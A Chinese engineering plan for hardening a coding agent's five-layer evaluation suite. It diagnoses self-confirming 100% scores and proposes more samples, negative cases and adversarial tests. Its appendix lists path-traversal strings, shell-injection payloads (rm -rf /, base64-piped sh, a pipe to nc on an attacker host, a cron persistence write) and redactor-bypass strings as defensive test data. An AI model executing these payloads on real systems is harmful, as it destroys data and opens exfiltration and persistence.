# 评测加固方案（Eval Hardening Plan）

> 状态：已实施（P0 + P1 + 轻量历史；2026-08-19 验证）
> 范围：Layer-1 regression / Layer-2 context / Layer-3 memory / Layer-4 resume / Layer-5 retrieval / 安全边界
> 目标：把"自证闭环式"的 100% 评测，改造为有统计意义、有区分度、含负例与对抗样本的可信评测。

---

## 0. TL;DR

当前五层评测 + 安全边界全部得到 100% 通过率，但这是**构造的必然**而非系统能力的真实度量。三个根因：

1. **测试数据与被测逻辑同源**：`script` 预设正确 `tool_calls`、`expect` 预设终答/文件、漂移突变配套检测逻辑、同义查询配套 substring=0 —— 形成自证闭环。
2. **样本量个位数**：tasks 12 条、retrieval 6 query，无统计意义，指标波动即噪声。
3. **全正例弱断言**：无负例、无对抗样本、`ok==1.0` 二值判定无区分度，无法回归检测退化。

改造分三档：**P0 数据扩充与解耦** → **P1 断言强化与负例** → **P2 范式升级（双轨 + 可区分度指标）**。

---

## 1. 根因诊断

### 1.1 自证闭环机制

所有 Layer 1–4 任务由 `benchmarks/tasks.json` 的 `script` 字段驱动，`script` 内含精确的 `tool_calls`（含参数）。`MockBackend`（`mycoder/models/__init__.py`）仅按脚本回放，不产生任何决策。评测因此度量的是"系统能否走通预设轨迹"，而非"系统能否在真实压力下保持正确"。

```
预设 script(含正确 tool_calls+参数)
      ↓
MockBackend 按脚本原样回放
      ↓
expect 弱断言(终答/文件由脚本预设)
      ↓
ok == 1.0  ──────────────── 自证闭环(数据与逻辑同源)
```

### 1.2 横向问题（影响所有层）

| 问题 | 表现 | 后果 |
|---|---|---|
| 样本量 | tasks 12 / retrieval 6 query / safety 个位数 | 无统计意义 |
| 断言强度 | `final_contains`、`files_created`、`status==completed` | 弱断言，正例必然通过 |
| 判定方式 | `ok = accuracy >= 1.0` / `== 1.0` | 二值，无区分度，无法量化退化 |
| 确定性 bias | 数据与逻辑同源设计 | 自证，100% 是设计而非结果 |
| 测试耦合 | `test_eval.py` 硬编码 `len==12`、`4/4` | 扩充数据需同步改测试 |

---

## 2. 逐层诊断

### 2.1 Layer-1 regression（4/4 通过）

**现状**：4 条最基础任务（创建/读/改/搜索），`script` 直填正确 `tool_calls`+参数，`expect` 多为 `final_contains`（终答也在 script 里预设）。

**证据**：
- `benchmarks/tasks.json` t01–t04：`script` 内 `file_write`/`file_read`/`file_edit`/`grep_search` 均含正确参数。
- `mycoder/eval/runner.py:156-159`：`final_contains` 仅检查终答子串。
- `tests/test_eval.py:27-30`：硬编码 `regression==4`。

**缺失**：
- 负例（错误参数应被拦截、读不存在文件应优雅失败、edit 不匹配 old_string 应报错）。
- 边界文件（空文件、二进制、超大、深嵌套路径）。
- edit 精确性断言（仅目标行变化，其余不动）。

### 2.2 Layer-2 context（平均压缩 ~80%，预算内 100%）

**现状**：`baseline(budget=10_000_000, keep_turns=1000)` 不治理 vs `governed(budget=1500)` 强制裁剪，~80% 压缩率本质是"开启裁剪后 token 变少"，是**机制生效证据**而非**治理质量**。`compliance=100%` 因 `hard_limit=2250` 远大于治理后实际占用。

**证据**：
- `mycoder/eval/runner.py:193` `budget = 1500`；`:198` baseline `budget=10_000_000, keep_turns=1000`。
- `:201` `ratio = 1 - gov_total/base_total`。
- `:224` `compliance_all = min(...)`，治理后远低于 2250 故恒 100%。
- `:230` `ok = bool(ratios) and compliance_all >= 1.0`。

**缺失**：
- 裁剪后**信息保留率**：折叠后能否答对依赖早期上下文的探针问题（现完全未测）。
- 压力预算边界：budget 贴边 `hard_limit` 时的行为。
- 多轮折叠累积信息损失。
- 压缩率只看 token 差，不看"折叠是否丢失关键符号/决策"。

### 2.3 Layer-3 memory（重读 2→0，正确率 100%）

**现状**："重读归零"是**脚本预设的**：follow-up 的 `script` 写死 `memory_query`，`control_script` 写死 `file_read`。系统根本没做"用记忆还是重读"的决策——是测试数据替它选好了。正确率 100% 因 `expect` 只看 `files_created`/`final_contains`，而文件内容由 `file_write` 预设。仅 2 对 follow-up。

**证据**：
- `benchmarks/tasks.json` t09：`script` 含 `memory_query`，`control_script` 含 `file_read`（:121-130）。
- `mycoder/eval/runner.py:247-249`：`script_field="script"` vs `"control_script"` 分别跑，`_count_reads` 比对。
- `:260` `re_read_reduced_to_zero = (re_read_with == 0)` —— 但 `re_read_with` 由 script 决定，非系统决策。
- `tests/test_eval.py:36-43`：硬编码 `parents==2, children==2`。

**缺失**：
- 记忆过期：文件已改、哈希变，旧摘要应作废、必须重读（`store.py:163 has_fresh_summary` 的反向用例）。
- 命中错误文件：记忆命中但实际无关。
- 记忆缺失降级：无记忆时应优雅降级（允许重读，不应崩）。
- 样本扩到 5+ 对。

### 2.4 Layer-4 resume（漂移 5/5 + 5/5 = 100%，恢复完成 100%）

**现状**：10 场景全用同一 `t12_resume_scenario`，仅 `stop_after=k` 不同。漂移检测是精确哈希比对（`drift.py:44-51 compare`），`_mutate_workspace`（改 step1 内容、加 external.txt、删 step2）必然触发 modified/added/deleted —— **已知突变 vs 已知检测**的套圈。恢复完成率看 `step4.txt` 存在，而 step4 由 resume 续跑同 script 必然生成。

**证据**：
- `mycoder/eval/runner.py:276-281`：`for k in (1,2,3,4,5): for want_drift in (False,True)`。
- `:283` `self._mutate_workspace(wd, k)`。
- `:293-296` `completed = status=="completed" and step4.exists() and "构建完成" in final_answer`。
- `mycoder/checkpoint/drift.py:44-51`：纯集合差 + 哈希比对。

**缺失**：
- 语义不变内容变（仅空白/格式化）→ 现检测会误报漂移，需明确这是设计取舍并测之。
- 多任务恢复（不止 t12）。
- 漂移后**内容正确性**（恢复续跑产出的文件内容是否正确，非仅存在）。
- 大规模漂移性能（数百文件变化）。

### 2.5 Layer-5 retrieval（hybrid 100% vs substring 0%）

**现状**：6 条查询全是同义改写（无共同子串），故 substring 必为 0；corpus 仅 4–5 条、relevant 多为 1–2 条，top-3 几乎必中。hybrid 100% 是 `HashingEmbedder` 字符 n-gram 在小语料上的必然，而非语义能力。`ok` 要求 `hybrid_wins == total_q`，即每条 hybrid 都得胜——这排斥了"substring 本应命中的精确匹配用例"。

**证据**：
- `benchmarks/retrieval.json`：3 任务 × 2 query = 6，corpus 4–5 条。
- `mycoder/eval/runner.py:346` `if row["hybrid@3"] > row["substring@3"]: hybrid_wins += 1`。
- `:359-360` `ok = hybrid_wins == total_q and ...`。
- `mycoder/memory/store.py:236-240` substring：`query.lower() in d["text"].lower()`。

**缺失**：
- 精确匹配用例：query 含原文子串 → substring 应命中（现全 0 是因没这类用例，不反映 substring 真能工作）。
- 反义/强干扰项：hybrid 应把无关项排到 top-k 外。
- 无结果 query：应返回空，recall=0 才正确。
- 跨语言、长 query、top-k 边界（k>corpus）。
- corpus 扩到 20–50。

### 2.6 安全边界（参数校验 100%、路径逃逸 100%）

**现状**：教科书式 payload（`../secret.txt`、`a/../../evil.txt`）配套 `resolve()+commonpath`（`sandbox.py:30-47`）。参数校验 7 例覆盖缺必填/未知参数/类型错/enum 越界/范围。均为"已知攻击 vs 已知防御"。

**证据**：
- `tests/test_safety.py:53-61`：4 条路径逃逸用例。
- `tests/test_safety.py:28-36`：7 条参数校验用例。
- `mycoder/tools/sandbox.py:30-47`：`resolve()` 拒绝对路径、`commonpath` 断言。

**缺失**：真实 OWASP 路径遍历 payload 库、编码绕过、符号链接、Windows UNC、空字节、超长路径、shell 注入变体、redactor 绕过。详见 §6 附录。

---

## 3. 改造方案

### 3.1 P0 — 数据扩充与解耦（立即见效，低风险）

**目标**：样本量从个位数提到 15–30，解耦测试硬编码，引入参数化生成器降低确定性 bias。

**改动文件**：
- 新增 `benchmarks/generators.py`：参数化数据生成（固定 seed），按 layer 产出正/负/边界用例。
- 扩充 `benchmarks/tasks.json`：每层 4 → 15–20（可由 generator 生成后固化，或手写+生成混合）。
- 扩充 `benchmarks/retrieval.json`：6 query → 30+，corpus 4–5 → 20–50，覆盖 4 类查询。
- 修改 `tests/test_eval.py`：`len==12`/`4/4`/`parents==2` 等改为 `>=` 或动态读取，解耦数量。

**generators.py 骨架**：
```python
import random
from pathlib import Path

def gen_regression_tasks(seed: int = 0) -> list[dict]:
    rng = random.Random(seed)
    tasks = []
    # 正例：基础 CRUD
    # 负例：错误参数(缺必填/类型错/enum越界)、读不存在文件、edit old_string 不匹配
    # 边界：空文件、二进制、深嵌套路径
    ...
    return tasks

def gen_retrieval_corpus(seed: int = 0) -> list[dict]:
    rng = random.Random(seed)
    # 4 类 query: exact / synonym / distractor / empty
    # corpus 扩到 20-50 条, 含强干扰项
    ...

def gen_memory_pairs(seed: int = 0) -> list[dict]:
    # 5+ 对 follow-up, 含 stale(文件已改)/wrong_hit/missing 降级场景
    ...
```

**retrieval.json 四类查询结构**：
```json
{
  "queries": [
    {"q": "用户登录功能", "relevant": ["d1"], "type": "exact"},
    {"q": "用户登入流程的会话校验", "relevant": ["d1","d3"], "type": "synonym"},
    {"q": "如何注销账号并删除所有数据", "relevant": [], "type": "distractor"},
    {"q": "量子计算原理", "relevant": [], "type": "empty"}
  ]
}
```

### 3.2 P1 — 断言强化与负例

**Layer-1 regression**：
- 负例：`expect.should_fail = true` 的任务（错误参数应被 guard 拦截、读不存在文件应 status≠completed 或优雅降级、edit old_string 不匹配应报错）。`runner._check_expect` 需支持 `should_fail` 分支。
- edit 精确性：`expect.file_unchanged_except = {"app.py": "VERSION"}`，断言除目标行外其余不变。
- 边界文件：空文件读取返回空非报错、二进制读取 errors=replace、超大文件 offset/limit 分页。

**Layer-2 context**：
- 新增"信息保留率"探针：折叠后注入一个依赖第 1 步细节的追问，断言终答含该细节。`expect.probe_contains`。
- 预算贴边：`budget` 设为使治理后 prompt 接近 `hard_limit` 的值，测触发边界行为。
- 多轮折叠：连续折叠 ≥3 次，测累积信息损失。
- 指标：`ok` 不再只看 compliance==100%，增加 `retention_rate >= 阈值`。

**Layer-3 memory**：
- stale 场景：父任务记摘要后，外部改文件内容（哈希变），follow-up 应检测过期并重读（`re_read_with` 允许 >0 且断言读到了新内容）。
- wrong_hit：记忆命中无关文件，应不误用。
- missing 降级：清空记忆，follow-up 应优雅重读而非崩。
- `ok` 改为分级：fresh_hit=重读0、stale=正确重读、missing=优雅降级，各自独立判定。

**Layer-4 resume**：
- 多任务：resume 任务从 1 个扩到 3–5 个不同结构。
- 漂移类型扩展：content-change（现有）、whitespace-only（语义不变哈希变，明确为设计取舍并测误报）、benign-reformat、large-scale（性能）。
- 恢复后内容正确性：`expect.file_contains` 断言续跑产出文件**内容正确**，非仅 `exists()`。
- `ok`：漂移识别准确率 + 恢复后内容正确率两个独立指标。

**Layer-5 retrieval**：
- 四类查询（见 §3.1），`ok` 按类型分别判定：
  - exact：substring 应命中（substring@3 > 0）。
  - synonym：hybrid > substring（现有逻辑）。
  - distractor/empty：relevant 为空，top-k 应不含强干扰项（precision@3 检查）。
- corpus 扩量 + 强干扰项。
- 指标：MRR / nDCG 替代纯 recall@3。

**安全边界**：详见 §6 附录 payload 清单，参数化注入。

### 3.3 P2 — 评测范式升级（工程量较大，可选）

- **双轨**：mock track（回归基线，确定性，现有）+ 真实模型 track（能力评测，`eval --backend local_openai`，离线时跳过）。真实 track 不预设 script，让模型自行决策，度量真实能力。
- **可区分度指标**：所有层 `ok` 从二值改为部分分（0–1 连续），记录通过率分布（如 regression 18/20），便于回归对比。
- **随机化**：seed 参数化，回归集（固定 seed，可复现）+ 压力集（随机 seed，每次不同子集）分离，降低确定性 bias。
- **基线对比**：每次评测落盘历史对比（`eval_history.jsonl`），检测指标退化。

---

## 4. 落地清单（文件级）

| 文件 | 改动 | 档位 |
|---|---|---|
| `benchmarks/generators.py` | 新增：参数化数据生成器 | P0 |
| `benchmarks/tasks.json` | 扩充至每层 15–20，加负例/边界 | P0/P1 |
| `benchmarks/retrieval.json` | 30+ query，4 类，corpus 20–50 | P0/P1 |
| `mycoder/eval/runner.py` | `_check_expect` 支持 `should_fail`/`file_unchanged_except`/`probe_contains`；Layer-2 加 retention；Layer-3 加 stale/wrong/missing；Layer-4 加多任务+内容正确性；Layer-5 按类型判定+MRR | P1 |
| `tests/test_eval.py` | 解耦 `len==12`/`4/4` 等硬编码为 `>=` 或动态 | P0 |
| `tests/test_safety.py` | 参数化注入 OWASP payload 库（§6） | P1 |
| `mycoder/eval/runner.py` | 双轨 + 可区分度 + 历史对比 | P2 |

---

## 5. 验收标准

- **样本量**：每层 ≥15，retrieval query ≥30，safety payload ≥40。
- **负例覆盖**：每层至少 20% 为应失败/边界用例，且有对应断言。
- **区分度**：指标为连续值或 X/Y 通过率，非单一 100%；故意注入一个退化（如关闭记忆）应使对应指标明显下降（回归灵敏度验证）。
- **解耦**：扩充数据不需改 `test_eval.py` 数量断言。
- **确定性**：mock track 仍可复现（固定 seed）；真实 track 离线跳过。
- **回归灵敏度**：临时破坏一个被测能力（如注释掉 drift 检测），对应层指标应从 ~100% 跌至显著低值，证明评测能捕获退化。

---

## 6. 附录：对抗样本 / Payload 清单

### 6.1 路径遍历（path traversal）

```python
PATH_TRAVERSAL_PAYLOADS = [
    "../secret.txt",                       # 基础
    "..%2fsecret.txt",                     # URL 编码 /
    "%2e%2e%2fsecret.txt",                 # 全编码
    "..%c0%afsecret.txt",                  # overlong UTF-8
    "....//....//secret.txt",              # 过滤绕过
    "..\\..\\secret.txt",                  # Windows 反斜杠
    "..%5c..%5csecret.txt",                # Windows 编码
    "/etc/passwd",                         # 绝对路径(Linux)
    "C:\\Windows\\system32\\config\\SAM",  # 绝对路径(Windows)
    "\\\\server\\share\\file",             # UNC 路径
    "file.txt\x00../secret.txt",           # 空字节截断
    "./a/./b/../../secret.txt",            # 混合 ./
    "." * 260 + "/x.txt",                  # 超长路径
    "\uff0e\uff0e/secret.txt",             # fullwidth .. (U+FF0E)
]
```

> 注意：符号链接攻击需在 workspace 内创建指向外部的 symlink 后读取，验证 `resolve()` 是否展开链接逃逸。`sandbox.py:39` 用 `resolve()` 会展开 symlink，但 `commonpath` 仍应拦截——需实测确认。

### 6.2 Shell 注入变体

```python
SHELL_INJECTION_PAYLOADS = [
    "echo safe; rm -rf /",                 # 命令分隔
    "echo $(rm -rf /)",                    # 命令替换 $()
    "echo `rm -rf /`",                     # 命令替换 ``
    "echo safe && rm -rf /",               # 逻辑与
    "echo safe\r\nrm -rf /",               # CRLF 注入
    "rm${IFS}-rf${IFS}/",                  # IFS 绕过
    "ec\\ho hi",                           # 反斜杠拆分
    "echo cm0gLXJmIC8=|base64 -d|sh",      # base64 编码
    "echo hi | nc attacker 4444",          # 管道外联
    "echo hi > /etc/cron.d/persist",       # 持久化写入
]
```

### 6.3 Redactor 绕过

```python
REDACT_BYPASS_PAYLOADS = [
    "key=sk-abcdefghijklmnopqrstuvwxyz",           # 现有
    "key = sk-abcdefghijklmnopqrstuvwxyz",         # 空格分隔
    "KEY:sk-abcdefghijklmnopqrstuvwxyz",           # 冒号
    "sk-abcdefghijklmnopqrstuvwxyz\n",             # 换行
    "sk-abcdef" + "ghijklmnopqrstuvwxyz",         # 拼接(代码层)
    "Authorization: Bearer SECRETTOKEN",           # 现有
    "-----BEGIN RSA PRIVATE KEY-----\nAAAA\n-----END RSA PRIVATE KEY-----",  # 现有
    "password=supersecret123",                     # 现有
]
```

### 6.4 检索查询四类（retrieval）

| 类型 | 期望 substring | 期望 hybrid | 用途 |
|---|---|---|---|
| exact（含原文子串） | 命中 (>0) | 命中 | 验证 substring 本身能工作 |
| synonym（同义改写） | 0 | >0 | 验证 hybrid 语义增益 |
| distractor（强干扰反义） | 0 | top-k 外 | 验证不误召回 |
| empty（无相关） | 0 | 0 | 验证空结果正确处理 |

### 6.5 记忆场景矩阵（memory）

| 场景 | 文件状态 | 期望行为 | re_read_with |
|---|---|---|---|
| fresh_hit | 哈希一致 | 用记忆不重读 | 0 |
| stale | 文件已改(哈希变) | 作废旧摘要、重读新内容 | >0 且内容正确 |
| wrong_hit | 命中无关文件 | 不误用 | 视情况 |
| missing | 无记忆 | 优雅降级、重读 | >0 且不崩 |

### 6.6 漂移类型矩阵（resume）

| 类型 | 内容变化 | 语义变化 | 现检测 | 期望 |
|---|---|---|---|---|
| content-change | 是 | 是 | 检出 ✓ | 检出(现有) |
| added | 新增 | — | 检出 ✓ | 检出(现有) |
| deleted | 删除 | — | 检出 ✓ | 检出(现有) |
| whitespace-only | 仅空白 | 否 | 误报漂移 | 明确为设计取舍,测之 |
| benign-reformat | 格式化 | 否 | 误报 | 同上 |
| large-scale | 数百文件 | 是 | 检出 | 检出 + 性能不退化 |
